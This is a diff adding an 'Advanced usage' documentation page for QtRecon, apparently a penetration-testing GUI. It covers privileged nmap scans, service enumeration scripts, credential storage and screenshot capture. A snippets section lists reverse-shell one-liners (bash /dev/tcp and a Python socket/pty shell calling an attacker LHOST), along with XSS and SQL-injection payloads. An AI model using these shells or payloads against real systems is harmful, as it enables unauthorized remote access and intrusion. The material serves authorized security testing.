@@ -1,0 +1,474 @@
+---
+title: Advanced usage
+description: Privileged scans, custom scripts, credential integration, and advanced QtRecon features
+---
+
+Unlock QtRecon's full potential with privileged scanning, custom enumeration scripts, credential management, and automated screenshot capture.
+
+## Privileged scans
+
+Some scan types require root privileges for full functionality.
+
+### Why privileges matter
+
+**SYN scans (-sS)**
+- Faster and stealthier than connect scans
+- Requires raw socket access (root)
+- Default scan type in QtRecon
+
+**OS detection (-O)**
+- Fingerprints operating systems
+- Needs raw packet crafting
+- More accurate with root
+
+**Version detection (-sV)**
+- Works without root but limited on some ports
+
+### Configuring graphical sudo
+
+QtRecon uses `pkexec` by default to elevate privileges:
+
+```json
+"core_binaries": {
+    "graphical_su": {
+        "binary": "/usr/bin/pkexec",
+        "args": []
+    }
+}
+```
+
+**Alternative options:**
+- `gksu` - Older GTK-based systems
+- `kdesudo` - KDE environments
+- Empty string `""` - If running QtRecon as root
+
+### Umask and file permissions
+
+<Warning>
+  A restrictive umask can prevent QtRecon from reading nmap XML output created by root.
+</Warning>
+
+From the README:
+> The final XML file created by root must be readable by your user, meaning that a restrictive umask won't let you parse nmap run as root (needed for OS detection and syn scan mode).
+
+**Solutions:**
+
+1. **Run QtRecon as root** (not recommended for security)
+   ```bash
+   sudo pipenv run python qtrecon.py
+   ```
+   Set `graphical_su.binary` to empty string:
+   ```json
+   "graphical_su": {
+       "binary": "",
+       "args": []
+   }
+   ```
+
+2. **Adjust umask before scanning**
+   ```bash
+   umask 022  # Ensures readable output
+   pipenv run python qtrecon.py
+   ```
+
+3. **Change nmap output directory permissions**
+   ```bash
+   sudo chmod -R 755 /tmp/QtRecon
+   ```
+
+### Nmap options for privileged scans
+
+Configure scan behavior in `conf.json:576-586`:
+```json
+"nmap_options": {
+    "ports": "T:-,U:53,161,631",
+    "type": "-sS",
+    "speed": "-T3",
+    "skip_host_discovery": false,
+    "version_probing": true,
+    "default_scripts": true,
+    "os_detection": true,
+    "tcp_and_udp": true,
+    "additional_args": "-v --min-rate 500"
+}
+```
+
+## Custom enumeration scripts
+
+QtRecon includes ready-made scripts for common services in the `scripts/` directory.
+
+### SMB enumeration script
+
+The SMB script at `scripts/smb.sh` demonstrates complex enumeration:
+
+**Anonymous enumeration**
+```bash
+./scripts/smb.sh 10.10.10.100
+```
+
+Runs:
+- CrackMapExec for SMB version and shares
+- `smbclient` for anonymous listing
+- `enum4linux-ng` for comprehensive enumeration
+- Nmap SMB vulnerability scripts
+
+**Authenticated enumeration**
+```bash
+./scripts/smb.sh 10.10.10.100 DOMAIN username password
+```
+
+From `scripts/smb.sh:69-77`:
+```bash
+cd /opt/CrackMapExec
+if [ "$domain" == "." ]; then
+    echo "$ cme smb $1 -u '$username' -p '$password' --local-auth --shares" 
+    poetry run cme smb "$1" -d "$domain" -u "$username" -p "$password" --shares 2>/dev/null
+else
+    echo "$ cme smb $1 -d '$domain' -u '$username' -p '$password' --shares" 
+    poetry run cme smb "$1" -d "$domain" -u "$username" -p "$password" --shares 2>/dev/null
+fi
+```
+
+### Redis enumeration script
+
+Minimal script for Redis at `scripts/redis.sh:13-15`:
+```bash
+#!/bin/bash
+echo "$ nmap --script redis-info -sV -p 6379 $1"
+nmap --script redis-info -sV -p 6379 "$1"
+```
+
+### Web service script
+
+The web script `scripts/web.sh:13-15` shows how to pass port arguments:
+```bash
+#!/bin/bash
+echo "$ davtest $1:$2"
+davtest $1:$2
+```
+
+Used with:
+```json
+"args": ["scripts/web.sh", "%%%IP%%%", "%%%PORT%%%"]
+```
+
+### Creating your own scripts
+
+<Steps>
+  <Step title="Write the script">
+    Create a bash script in `scripts/` directory:
+
+    ```bash
+    #!/bin/bash
+    # scripts/mssql_enum.sh
+
+    if [ -z "$1" ]; then
+        echo 'No target provided!'
+        echo "Usage: $0 target [username] [password]"
+        exit 1
+    fi
+
+    TARGET=$1
+    USERNAME=${2:-"sa"}
+    PASSWORD=$3
+
+    echo "[*] Enumerating MSSQL on $TARGET"
+
+    # Version detection
+    nmap -p 1433 --script ms-sql-info "$TARGET"
+
+    # If credentials provided
+    if [ -n "$PASSWORD" ]; then
+        echo "[*] Testing credentials $USERNAME:$PASSWORD"
+        nmap -p 1433 --script ms-sql-query \
+             --script-args mssql.username="$USERNAME",mssql.password="$PASSWORD" \
+             "$TARGET"
+    fi
+    ```
+  </Step>
+
+  <Step title="Make executable">
+    ```bash
+    chmod +x scripts/mssql_enum.sh
+    ```
+  </Step>
+
+  <Step title="Add to user_binaries">
+    ```json
+    "mssql_custom": {
+        "name": "MSSQL Custom Enum",
+        "text": "Run custom MSSQL enumeration",
+        "detached": false,
+        "binary": "/bin/bash",
+        "args": [
+            "scripts/mssql_enum.sh",
+            "%%%IP%%%",
+            "%%%USERNAME%%%",
+            "%%%PASSWORD%%%"
+        ]
+    }
+    ```
+  </Step>
+
+  <Step title="Test the script">
+    Run manually first:
+    ```bash
+    ./scripts/mssql_enum.sh 10.10.10.50
+    ```
+    Then test through QtRecon interface.
+  </Step>
+</Steps>
+
+## Credential integration
+
+Store and use credentials for authenticated enumeration.
+
+### Adding credentials
+
+<Steps>
+  <Step title="Open credentials tab">
+    Click the **Credentials** tab in the main workspace.
+  </Step>
+
+  <Step title="Add new credential">
+    Right-click in the credentials table and select **Add Credential**.
+
+    Fill in:
+    - **Host** - Target IP or select from hosts
+    - **Type** - Password, hash, or SSH key
+    - **Domain** - Windows domain or workgroup
+    - **Username** - Account name
+    - **Password/Hash** - Authentication secret
+  </Step>
+
+  <Step title="Use in commands">
+    When launching tools with credential variables, QtRecon prompts:
+
+    "Credentials found for this host. Use them?"
+
+    Variables replaced:
+    - `%%%DOMAIN%%%`
+    - `%%%USERNAME%%%`
+    - `%%%PASSWORD%%%`
+    - `%%%HASH%%%`
+    - `%%%SSH_KEY%%%`
+  </Step>
+</Steps>
+
+### Example: Authenticated RDP
+
+From `conf.json.example:179-186`:
+```json
+"xfreerdp": {
+    "name": "xfreerdp",
+    "text": "Launch xfreerdp",
+    "detached": true,
+    "in_terminal": false,
+    "binary": "/usr/bin/xfreerdp",
+    "args": [
+        "/v:%%%IP%%%",
+        "/d:%%%DOMAIN%%%",
+        "/u:%%%USERNAME%%%",
+        "/p:%%%PASSWORD%%%",
+        "/cert:ignore",
+        "/drive:tmp,/tmp",
+        "/dynamic-resolution",
+        "/kbd:%%%XFREERDP_KEYBOARD%%%"
+    ]
+}
+```
+
+When credentials exist for the host:
+1. User right-clicks RDP port (3389)
+2. Selects "Launch xfreerdp"
+3. QtRecon asks to use stored credentials
+4. xfreerdp launches with populated authentication
+
+### Credential types
+
+Stored in `core/database.py:19`:
+```sql
+CREATE TABLE hosts_creds(
+    id INTEGER primary key autoincrement not null,
+    host_id integer,
+    type TEXT DEFAULT 'password',
+    domain TEXT DEFAULT '',
+    username TEXT DEFAULT '',
+    password TEXT DEFAULT ''
+)
+```
+
+**Supported types:**
+- `password` - Plaintext passwords
+- `hash` - NTLM or other hashes
+- `ssh_key` - Path to SSH private key
+
+## Screenshot module
+
+Automatically capture screenshots during your engagement for evidence and review.
+
+### Configuration
+
+Screenshot settings in `conf.json:559-575`:
+```json
+"screenshots": {
+    "engine": "qt",
+    "interval": 15,
+    "dst_folder": "/home/user/Images/",
+    "work_folder": "/tmp/",
+    "pixel_threshold_different_images": 500,
+    "check_locked_screen": true,
+    "check_locked_screen_cmd": "dbus-send --session --dest=org.freedesktop.ScreenSaver --type=method_call --print-reply --reply-timeout=20000 /org/freedesktop/ScreenSaver org.freedesktop.ScreenSaver.GetActive",
+    "check_locked_screen_cmd_result": "boolean true",
+    "screenshot_cmd": "/usr/bin/spectacle -nfb -o %%%OUTPUT%%%",
+    "ignore_if_active_window": true,
+    "convert_png_to_jpg": true,
+    "include_processes": true,
+    "include_ocr": false
+}
+```
+
+### Setup steps
+
+<Steps>
+  <Step title="Choose engine">
+    **qt** (recommended)
+    - Built-in Qt screenshot capability
+    - Cross-platform compatible
+    - No external dependencies
+
+    **external**
+    - Uses `screenshot_cmd` command
+    - Requires spectacle, scrot, or similar
+  </Step>
+
+  <Step title="Configure intervals">
+    Set `interval` in seconds between captures:
+    - `15` - Every 15 seconds (default)
+    - `30` - Less frequent captures
+    - `5` - Very frequent (large storage)
+  </Step>
+
+  <Step title="Set output paths">
+    **work_folder**
+    - Temporary storage during session
+    - Screenshots accumulate here
+
+    **dst_folder**
+    - Final archive destination
+    - Compressed into single file at session end
+  </Step>
+
+  <Step title="Configure smart capture">
+    **pixel_threshold_different_images**
+    - Minimum pixels changed to capture
+    - Prevents duplicate screenshots
+    - `500` = skip if < 500 pixels changed
+
+    **ignore_if_active_window**
+    - Don't capture when QtRecon is focused
+    - Reduces unnecessary screenshots of the tool itself
+
+    **check_locked_screen**
+    - Skip captures when screen locked
+    - Privacy protection
+  </Step>
+
+  <Step title="Enable screenshot module">
+    From the menu:
+    **Tools → Start Screenshot Module**
+
+    QtRecon begins capturing based on your configuration.
+  </Step>
+</Steps>
+
+### Process tracking
+
+When `include_processes: true`, QtRecon creates a SQLite database alongside screenshots containing:
+- Process names running during each capture
+- Process IDs and parent PIDs
+- Timestamp correlation with screenshots
+
+Filtered by `processes_blacklist` to exclude system processes.
+
+### Screenshot storage
+
+Screenshots are:
+1. Captured to `work_folder`
+2. Converted to JPG if `convert_png_to_jpg: true`
+3. Archived at session end to `dst_folder`
+4. Timestamped filenames for chronological review
+
+## Snippet organization
+
+Quick access to frequently used commands and payloads.
+
+### Structure
+
+Snippets are organized hierarchically in `conf.json:332-558`:
+```json
+"snippets": {
+    "Category Name": [
+        "Section Title",
+        [
+            "command or payload",
+            "another command"
+        ],
+        "Subsection",
+        [
+            "Nested Title",
+            [
+                "nested command"
+            ]
+        ]
+    ]
+}
+```
+
+### Example: Reverse shells
+
+```json
+"Reverse shells": [
+    "Launching the reverse shell",
+    [
+        "socat -dd tcp-listen:%%%LPORT%%%,reuseaddr,fork,bind=%%%LHOST%%% stdio"
+    ],
+    "Bash TCP",
+    [
+        "bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1",
+        "0<&196;exec 196<>/dev/tcp/%%%LHOST%%%/%%%LPORT%%%; sh <&196 >&196 2>&196"
+    ],
+    "Python",
+    [
+        "IPv4",
+        [
+            "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%%%LHOST%%%\",%%%LPORT%%%));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
+        ]
+    ]
+]
+```
+
+### Using snippets
+
+1. Click **Snippets** tab
+2. Navigate hierarchy
+3. Click command to copy to clipboard
+4. Variables like `%%%LHOST%%%` and `%%%LPORT%%%` auto-replace based on `user_prefs`
+
+### Custom snippets
+
+Add your own categories:
+```json
+"Web Payloads": [
+    "XSS",
+    [
+        "<script>alert(document.domain)</script>",
+        "<img src=x onerror=alert(1)>"
+    ],
+    "SQLi",
+    [
+        "' OR '1'='1",
+        "1' UNION SELECT NULL,NULL,NULL--"
+    ]
+]
+```
